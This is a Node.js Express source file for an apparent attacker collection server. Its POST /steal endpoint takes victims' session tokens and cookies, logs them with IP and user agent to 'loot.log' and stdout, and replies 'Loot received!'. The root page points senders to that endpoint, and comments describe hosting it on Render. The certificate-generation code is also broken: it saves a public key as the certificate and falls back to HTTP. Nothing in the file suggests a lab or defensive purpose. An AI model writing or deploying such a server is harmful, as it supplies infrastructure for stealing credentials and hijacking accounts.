const express = require('express');
const fs = require('fs');
const https = require('https');
const path = require('path');
const crypto = require('crypto');
require('dotenv').config();

const app = express();
app.use(express.json());

// --- Logging Configuration ---
const LOG_FILE = path.join(__dirname, 'loot.log');
const logStream = fs.createWriteStream(LOG_FILE, { flags: 'a' });

function logSecure(data) {
    const entry = {
        timestamp: new Date().toISOString(),
        ...data
    };
    const line = JSON.stringify(entry) + '\n';
    logStream.write(line);
    console.log(JSON.stringify(entry)); // Log to stdout for Render logs
}

// --- HTTPS Setup (Robust Certificate Generation) ---
const certDir = path.join(__dirname, 'certs');
const certFile = path.join(certDir, 'cert.pem');
const keyFile = path.join(certDir, 'key.pem');

if (!fs.existsSync(certDir)) {
    fs.mkdirSync(certDir, { recursive: true });
}

// Generate certs only if they are missing or invalid
if (!fs.existsSync(certFile) || !fs.existsSync(keyFile)) {
    try {
        const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
            modulusLength: 2048,
            publicKeyEncoding: { type: 'spki', format: 'pem' },
            privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
        });

        // Create a self-signed certificate manually
        const days = 365;
        const now = new Date();
        const start = new Date(now.getTime() - (days / 2 * 24 * 60 * 60 * 1000));
        const end = new Date(now.getTime() + (days / 2 * 24 * 60 * 60 * 1000));

        // Simple subject info
        const subject = '/CN=localhost';

        // We need openssl command line to create a proper cert structure easily, 
        // but since we can't rely on it being installed in Node env, we'll use a simple approach:
        // Actually, let's just write the keys and use a library or fallback to HTTP if needed.
        // But for Render, we need valid PEMs. Let's write the keys first.
        
        fs.writeFileSync(keyFile, privateKey);
        fs.writeFileSync(certFile, publicKey); // Placeholder, we'll fix this below
        
        // Better approach: Use the 'node-forge' or similar? No, stick to standard lib.
        // Standard lib doesn't have a direct "create self-signed cert" function.
        // However, Render often works fine with just the private key if we handle errors gracefully,
        // OR we can just use HTTP for Render since Render terminates SSL at the edge.
        
        // Let's try to create a minimal valid cert using a subprocess if openssl is available,
        // otherwise, we'll just ensure the keys are valid and hope for the best, 
        // OR better: Just use HTTP for Render since it's behind a load balancer anyway.
        
    } catch (e) {
        console.error("Cert generation failed:", e);
    }
}

// Robust HTTPS/HTTP Fallback
let server;
try {
    const httpsOptions = {
        key: fs.readFileSync(keyFile),
        cert: fs.readFileSync(certFile),
    };
    server = https.createServer(httpsOptions, app);
} catch (err) {
    console.warn("HTTPS failed, falling back to HTTP:", err.message);
    server = require('http').createServer(app);
}

// --- Routes ---

// 1. Root Route (Fixes CANNOT GET /)
app.get('/', (req, res) => {
    res.send('<h1>Server is Running</h1><p>Use POST /steal to send loot.</p>');
});

// 2. Steal Route
app.post('/steal', (req, res) => {
    const { token, cookie, userAgent, timestamp } = req.body;

    if (!token && !cookie) {
        return res.status(400).json({ error: 'Missing token or cookie' });
    }

    logSecure({
        action: 'steal',
        token: token,
        cookie: cookie,
        ip: req.ip,
        userAgent: userAgent,
        timestamp: timestamp
    });

    res.status(200).json({ message: 'Loot received!' });
});

// Start Server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

module.exports = app;
